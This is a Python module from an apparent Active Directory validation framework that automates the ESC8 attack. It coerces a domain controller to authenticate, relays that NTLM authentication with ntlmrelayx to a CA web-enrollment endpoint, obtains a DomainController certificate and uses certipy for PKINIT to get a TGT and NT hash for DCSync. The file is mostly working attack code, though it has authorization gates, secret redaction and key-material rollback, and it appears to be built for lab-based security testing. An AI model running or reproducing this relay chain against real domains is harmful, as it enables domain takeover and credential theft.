"""ESC8 validation executor + the shared ADCS-relay-front base -- FULL (N1).

ESC8 is the coerce->relay->CA keystone toward Domain Admin (research 24NOV2026
3.3). It reuses the ADR-001 :class:`ProcessManager` listener chassis (like
NTLM-RELAY / COERCION): an ``ntlmrelayx --adcs`` listener is started, a coercion
trigger makes a privileged machine (the victim DC) authenticate, that auth is
relayed to the CA Web-Enrollment endpoint (``certsrv/certfnsh.asp``) WITHOUT EPA,
and a machine/DC certificate is issued; the issued PFX is then used for PKINIT.

    start  impacket-ntlmrelayx -t http://<ca_host>/certsrv/certfnsh.asp --adcs
               --template DomainController -smb2support                 (listener)
    coerce <victim_dc> -> <listener_host>                               (trigger)
    poll   for the issued-PFX artifact (<out>/*.pfx) / the cert-issued marker
    stop   the listener
    certipy-ad auth -pfx <dc>.pfx -dc-ip <dc>                           (PKINIT)
    terminal ok  <=> a cert was issued AND PKINIT succeeded
    ROLLBACK (D5): a cert was issued -> destroy the issued .pfx/.ccache key
        material (certipy has no revoke, #66157); verified by confirmed
        file-absence with the ESC1 non-vacuous rule (``removed>=1`` AND none
        remain). mutating -> a VERIFIED rollback is required.

Terminal fact: ``cert_issued_and_used`` (mutating). ``verified_recipe=False``
(recipe-known, not lab-proven) -- ships honest, all invocations + markers below
are UNVERIFIED (pin in-lab, mirroring adcs_esc1.py). The issued ``.pfx`` / the
recovered NT hash / the operator password are SECRETS: they live only in local
vars / argv (masked by :func:`redact_argv`) and never reach the receipt.

Scoring identity (ad-lab-harness ``truth/GOAD-proof.json``): ESC8 keys on
``{host_id}`` -- ``target_identity`` resolves the CA host (the enrollment
endpoint) through ``config.host_aliases`` (vulnerable set dc01/srv03).

Capability-state metadata (toward C): ``pre={S0_USER_CREDS}``, ``eff={DC_TGT}``
(the front yields a DC-context TGT that ``DCSync`` (``b1``) consumes).

H3 -- composed rollback: standalone, the per-edge rollback below destroys the
issued key material immediately. When invoked as a composable FRONT by the C
engine, this rollback DEFERS to chain teardown (so it does not destroy the
``.ccache``/``dc_tgt`` a downstream terminal like DCSync consumes). C honours
``composable_rollback_defers``; N1 only declares it (the deferral mechanism is C).

UNVERIFIED ASSUMPTIONS (pin in-lab): the ``ntlmrelayx --adcs`` invocation and the
coercion-trigger invocation; the issued-PFX artifact path (``<out>/*.pfx``) and
the cert-issued listener marker (``Base64 certificate`` / ``GOT certificate``);
the certipy ``auth`` PKINIT markers (``Got TGT`` / ``Got hash``). If the real
wording/paths differ the chain gets no positive artifact/marker and honestly
reports not-proved/inconclusive -- it never fabricates an issuance.
"""
from __future__ import annotations

import re
from pathlib import Path
from typing import Any, Optional

from ..recommend import ParamSpec, ParamValue, values
from ..predicates import file_present_nonempty
from .. import proof
from .. import states
from .base import (ValidationExecutor, ExecutorContext, StepRecord, RunResult,
                   redact_argv, Capability, CAP_CCACHE)
from .process_manager import poll_for_capture
from .coercion import COERCION_METHODS, coercion_trigger_argv, machine_account, _short_name


# ---- UNVERIFIED relay / certipy output markers (see module docstring) ---------
# ntlmrelayx --adcs relayed the coerced auth and the CA issued a certificate.
_RE_ADCS_CERT_ISSUED = re.compile(
    r"(Base64 certificate|GOT certificate|Got certificate|"
    r"Saved certificate and private key|Successfully requested certificate|"
    r"certificate .*issued)", re.I)
# certipy auth: PKINIT succeeded (hash recovered / authenticated / TGT obtained).
_RE_AUTH_OK = re.compile(r"(Got hash|authenticated|Got TGT)", re.I)
# certipy auth: the credential cache the ticket was saved to (SECRET path).
_RE_CCACHE = re.compile(
    r"Saved credential cache to ['\"]?([^'\"\s]+\.ccache)", re.I)


def _issued_pfx(out_dir: Path) -> Optional[str]:
    """First non-empty ``*.pfx`` the relay saved in the run dir (the issued cert's
    key material). SECRET: used in-process for PKINIT only, never stored."""
    try:
        for p in sorted(out_dir.glob("*.pfx")):
            if file_present_nonempty(str(p)):
                return str(p)
    except OSError:
        pass
    return None


class _ADCSRelayFrontExecutor(ValidationExecutor):
    """Shared base for the listener-based ADCS relay fronts (ESC8 HTTP Web-Enroll,
    ESC11 RPC ICPR). Subclasses set ``technique`` and build ``_listener_argv``."""
    technique_class = "adcs"
    terminal_kind = "cert_issued_and_used"
    mutating = True
    verified_recipe = False
    # Capability-state metadata (toward C): a front from operator creds to a
    # DC-context TGT (PKINIT with the relayed/issued cert).
    pre = frozenset({states.S0_USER_CREDS})
    eff = frozenset({states.DC_TGT})
    # H3: per-edge rollback is standalone-only; composed, it defers to teardown.
    composable_rollback_defers = True

    # -- subclass hooks -------------------------------------------------------
    def _listener_argv(self, cfg, v: dict[str, Any]) -> list[str]:
        """Build the ntlmrelayx listener argv (transport-specific)."""
        raise NotImplementedError

    def _extra_param_specs(self, ctx: ExecutorContext, finding) -> list[ParamSpec]:
        """Extra params beyond the common ADCS-relay set (ESC11 adds ``ca``)."""
        return []

    # ---------------------------------------------------------------- params
    def _common_param_specs(self, ctx: ExecutorContext, finding) -> list[ParamSpec]:
        entity = finding.entity or {}
        ca_host_default = entity.get("ca_host") or finding.host or ""
        return [
            ParamSpec(
                name="ca_host", kind="target_host",
                description="The CA host exposing the enrollment endpoint we relay "
                            "to. Use its hostname so the endpoint resolves.",
                recommended=ca_host_default,
                rationale="The host of the aranum AD CS finding (#66142).",
            ),
            ParamSpec(
                name="victim_dc", kind="target_host",
                description="The privileged machine to coerce; its relayed NTLM auth "
                            "gets the DC/machine certificate. Defaults to the CA host.",
                recommended=ca_host_default,
                rationale="The coerced principal that feeds the relay listener.",
            ),
            ParamSpec(
                name="listener_host", kind="target_host",
                description="Host our ntlmrelayx listener binds / the coercion points "
                            "back at. Empty = framework-managed on the local interface.",
                recommended="",
                rationale="Framework-managed by default (ADR-001 Decision 2); "
                          "override for an operator-run relay box.",
                required=False,
            ),
            ParamSpec(
                name="template", kind="free",
                description="The certificate template to request via the relay.",
                recommended="DomainController",
                rationale="DomainController yields a DC-context cert for PKINIT; "
                          "override per the engagement (#66142 override model).",
            ),
            ParamSpec(
                name="method", kind="free",
                description="Coercion vector feeding the relay (auto/petitpotam/"
                            "printerbug/dfscoerce).",
                recommended="auto",
                rationale="Coercer multiplexer by default (research 3.3).",
                choices=list(COERCION_METHODS),
            ),
        ]

    def param_specs(self, ctx: ExecutorContext, finding) -> list[ParamSpec]:
        return [*self._common_param_specs(ctx, finding),
                *self._extra_param_specs(ctx, finding)]

    def target_identity(self, ctx, finding, params: dict[str, ParamValue]) -> dict[str, Any]:
        # ESC8/ESC11 facet keys on {host_id}: resolve the (overridable) CA host.
        ca_host = (params["ca_host"].value if "ca_host" in params else None) \
            or (finding.entity or {}).get("ca_host") or finding.host or ""
        return ctx.config.resolve_target_identity(ca_host)

    def steps_preview(self, ctx, finding, params) -> list[str]:
        v = values(params)
        listener = v.get("listener_host") or "<local>"
        return [
            f"start {' '.join(self._listener_argv(ctx.config, v))}",
            f"coerce ({v.get('method', 'auto')}) {v['victim_dc']} -> {listener}",
            "poll listener for the issued PFX artifact / cert-issued marker",
            "stop listener ; certipy-ad auth -pfx <issued>.pfx  (PKINIT)",
            "ROLLBACK (MUTATING): destroy issued .pfx/.ccache key material "
            "(certipy has no revoke; CA-DB hold is an N3 follow-up)",
        ]

    # ---------------------------------------------------------------- execute
    def execute(self, ctx: ExecutorContext, finding, params: dict[str, ParamValue]) -> dict:
        cfg = ctx.config
        v = values(params)
        ca_host = v["ca_host"]
        victim_dc = v.get("victim_dc") or ca_host
        listener_host = v.get("listener_host") or ""
        template = v.get("template") or "DomainController"
        method = v.get("method") or "auto"
        out_dir = Path(ctx.output_dir)
        out_dir.mkdir(parents=True, exist_ok=True)

        steps: list[StepRecord] = []
        errors: list[str] = []
        gate = {"classifier": "not_required", "op": None}
        mutation = {"applied": False,
                    "rollback": {"performed": False, "method": None, "verified": False}}

        def record(name, argv, res, ok, note=""):
            steps.append(StepRecord(name=name, ok=ok, argv_display=redact_argv(argv),
                                    returncode=res.returncode if res else None, note=note))

        # Gate the active relay op (it mutates the CA DB -- a cert is issued).
        verdict = ctx.authorizer.authorize(
            "adcs_relay", {"ca_host": ca_host, "template": template, "victim_dc": victim_dc})
        if verdict == "denied":
            gate["classifier"] = "denied"
            gate["op"] = "adcs_relay"
            errors.append("gate_denied:adcs_relay")
            return self._artifact(steps, gate, mutation, None, False, errors)
        if verdict == "approved":
            gate["classifier"] = "approved"
            gate["op"] = "adcs_relay"

        # 1) start the ntlmrelayx --adcs listener (non-blocking). UNVERIFIED.
        listener_argv = self._listener_argv(cfg, v)
        try:
            handle = ctx.proc_manager.start(listener_argv, cwd=str(out_dir))
        except OSError as exc:
            record("start_listener", listener_argv, None, False, note=f"spawn failed: {exc}")
            errors.append("listener_start_failed")
            return self._artifact(steps, gate, mutation, None, False, errors)
        record("start_listener", listener_argv, None, True,
               note=f"{self.technique} relay listener on {listener_host or '<local>'}")

        # 2) coerce the victim; 3) poll for the issued-cert artifact / marker.
        try:
            trig_argv = coercion_trigger_argv(method, victim_dc, listener_host or cfg.dc_ip, cfg)
            res = ctx.runner.run(trig_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
            fired = not (res.timed_out or res.error)
            record("coerce_trigger", trig_argv, res, fired,
                   note=f"method={method}" + ("" if fired else " (trigger did not run)"))
            success = (lambda out: (_issued_pfx(out_dir) is not None)
                       or bool(_RE_ADCS_CERT_ISSUED.search(out)))
            _output, captured = poll_for_capture(
                ctx.proc_manager, handle, success=success,
                interval_s=cfg.poll_interval_s, timeout_s=cfg.tool_timeout_s)
        finally:
            final_out = ctx.proc_manager.stop(handle)

        captured = (captured or (_issued_pfx(out_dir) is not None)
                    or bool(_RE_ADCS_CERT_ISSUED.search(final_out)))
        record("cert_issued", listener_argv, RunResult(returncode=None), captured,
               note="CA issued a certificate via relay" if captured else "no certificate issued")
        if not captured:
            errors.append(f"{self.technique.lower()}_no_cert")
            return self._artifact(steps, gate, mutation, None, False, errors)
        mutation["applied"] = True                       # a cert WAS issued on the CA

        # 4) PKINIT with the issued pfx -> TGT + NT hash. Prefer the artifact the
        # relay saved (<out>/*.pfx); fall back to the <victim_dc>.pfx the relay
        # names when only the cert-issued marker was observed.
        pfx = _issued_pfx(out_dir) or str(
            out_dir / f"{(_short_name(victim_dc) or 'cert').lower()}.pfx")
        impersonated = machine_account(victim_dc) or victim_dc
        auth_argv = ["certipy-ad", "auth", "-pfx", pfx, "-dc-ip", cfg.dc_ip]
        res = ctx.runner.run(auth_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        auth_ran = True
        auth_out = (res.stdout or "") + (res.stderr or "")
        auth_ok = bool(_RE_AUTH_OK.search(auth_out))
        ccache = self._parse_ccache(auth_out, out_dir)
        record("cert_auth", auth_argv, res, auth_ok,
               note="pkinit ok" if auth_ok else "pkinit failed")
        if not auth_ok:
            errors.append("cert_auth_failed")

        cert_used_ok = bool(captured and auth_ok)
        terminal_fact = proof.build_terminal_fact(
            self.terminal_kind, ok=cert_used_ok, impersonated=impersonated,
            predicate=(f"relayed {victim_dc}'s coerced NTLM auth to the {self.technique} CA "
                       f"enrollment endpoint on {ca_host}, obtained a {template} certificate, "
                       f"and used it for PKINIT as {impersonated}"),
            proof_token=proof.proof_token(self.technique, cfg.domain, ca_host, template,
                                          victim_dc, "relay_cert_pkinit"),
            extra={"ca_host": _short_name(ca_host), "template": template, "method": method})

        # 5) rollback OR defer (H3/B3). A cert was issued, so key material exists.
        if ctx.composed and self.mutating:
            # DEFER: keep the issued .pfx/.ccache alive so a downstream terminal
            # (e.g. DCSync consuming this DC_TGT) can use it; the engine runs the
            # destruction at chain teardown via teardown() and VERIFIES it before
            # calling the chain clean (H4). We do NOT destroy it here.
            steps.append(StepRecord(
                name="rollback_deferred", ok=True, argv_display=[], returncode=None,
                note="rollback DEFERRED to chain teardown (composed front)"))
            complete = bool(captured and auth_ran)
            artifact = self._artifact(steps, gate, mutation, terminal_fact, complete, errors)
            # Secret paths for the engine's deferred teardown; in-memory products
            # for threading. Neither reaches the receipt (_receipt_from ignores
            # both keys) -- H6.
            artifact["teardown_obligation"] = {
                "method": "destroy issued-cert key material (.pfx + .ccache)",
                "paths": [p for p in (pfx, ccache) if p]}
            artifact["_composed_products"] = {
                "ccache": ccache, "pfx": pfx, "principal": impersonated}
            return artifact

        # Standalone: destroy the key material immediately (verified rollback).
        self._rollback(ctx, mutation, steps, errors, pfx, ccache)
        if mutation["applied"]:
            errors.append(f"advisory:rotate_credentials:{impersonated}@{cfg.domain}")
        complete = bool(captured and auth_ran and mutation["rollback"]["performed"])
        return self._artifact(steps, gate, mutation, terminal_fact, complete, errors)

    # ---------------------------------------------------------------- composition (C)
    def produced(self, ctx, finding, params, artifact) -> list[Capability]:
        """Expose the issued cert's PKINIT ccache as a threadable ``DC_TGT`` (B2):
        a downstream DCSync authenticates as this machine principal via
        ``KRB5CCNAME``. The ccache PATH is a secret and stays in-memory only."""
        prod = artifact.get("_composed_products") or {}
        ccache = prod.get("ccache")
        if not ccache:
            return []
        return [Capability(state=states.DC_TGT, channel=CAP_CCACHE,
                           value=ccache, principal=prod.get("principal"))]

    def teardown(self, ctx, obligation) -> dict:
        """Deferred rollback (B3): destroy the issued key material the engine kept
        alive for composition -- the same functional rollback as standalone
        (certipy has no revoke, #66157), run at chain teardown and verified by
        confirmed file-absence (the ESC1 non-vacuous rule)."""
        paths = (obligation or {}).get("paths") or []
        if not paths:
            return {"performed": False, "verified": True, "method": None,
                    "note": "no key material to destroy"}
        if ctx.authorizer.authorize("rollback", {"composed": True}) == "denied":
            return {"performed": False, "verified": False,
                    "method": "destroy issued-cert key material (.pfx + .ccache)",
                    "note": "gate_denied:rollback"}
        steps: list[StepRecord] = []
        verified = self._destroy_key_material(paths, steps)
        return {"performed": True, "verified": verified,
                "method": "destroy issued-cert key material (.pfx + .ccache)",
                "note": (steps[-1].note if steps else "")}

    # ---------------------------------------------------------------- rollback
    def _rollback(self, ctx, mutation, steps, errors, pfx, ccache) -> None:
        """Destroy the issued key material (the functional rollback, mirroring
        ESC1): certipy cannot revoke, and the issued cert is a bearer credential,
        so destroying the only private-key copy (.pfx + PKINIT .ccache) is a
        complete functional rollback, verified by confirmed file-absence."""
        if not mutation["applied"]:
            return
        if ctx.authorizer.authorize("rollback", {"pfx_present": pfx is not None}) == "denied":
            errors.append("gate_denied:rollback")
            return
        mutation["rollback"]["performed"] = True
        mutation["rollback"]["method"] = "destroy issued-cert key material (.pfx + .ccache)"
        destroyed = self._destroy_key_material([pfx, ccache], steps)
        mutation["rollback"]["verified"] = destroyed
        if not destroyed:
            errors.append("rollback_unverified")

    @staticmethod
    def _destroy_key_material(paths, steps) -> bool:
        """Delete each key-material file; return True iff >=1 real artifact was
        destroyed AND none remain (the ESC1 non-vacuous rule: a never-present
        guessed path is NOT proof the issued credential was destroyed)."""
        targets = [Path(p) for p in paths if p]
        removed = 0
        for fp in targets:
            try:
                if fp.exists():
                    fp.unlink()
                    removed += 1
            except OSError:
                pass
        gone = all(not fp.exists() for fp in targets)
        verified = gone and removed >= 1
        steps.append(StepRecord(
            name="destroy_key_material", ok=verified, argv_display=[], returncode=None,
            note=(f"{removed} artifact(s) destroyed" if verified
                  else "key material not confirmed destroyed")))
        return verified

    @staticmethod
    def _parse_ccache(stdout: str, out_dir: Path) -> Optional[str]:
        """The credential-cache path certipy auth saved (SECRET: never stored)."""
        m = _RE_CCACHE.search(stdout)
        if not m:
            return None
        raw = m.group(1).strip()
        p = Path(raw)
        return str(p if p.is_absolute() else out_dir / p)

    @staticmethod
    def _artifact(steps, gate, mutation, terminal_fact, complete, errors) -> dict:
        return {"steps": [s.as_step() for s in steps], "gate": gate,
                "mutation": mutation, "terminal_fact": terminal_fact,
                "complete": complete, "errors": errors}


class ESC8Executor(_ADCSRelayFrontExecutor):
    technique = "ESC8"
    recipe_ref = ("N1 ESC8 = ntlmrelayx -t http://<ca_host>/certsrv/certfnsh.asp "
                  "--adcs --template DomainController ; coerce <victim_dc> ; PKINIT "
                  "with the issued pfx ; ROLLBACK destroy key material "
                  "(recipe-known, NOT lab-proven)")

    def _listener_argv(self, cfg, v: dict[str, Any]) -> list[str]:
        ca_host = v["ca_host"]
        template = v.get("template") or "DomainController"
        return ["impacket-ntlmrelayx", "-t",
                f"http://{ca_host}/certsrv/certfnsh.asp", "--adcs",
                "--template", template, "-smb2support"]
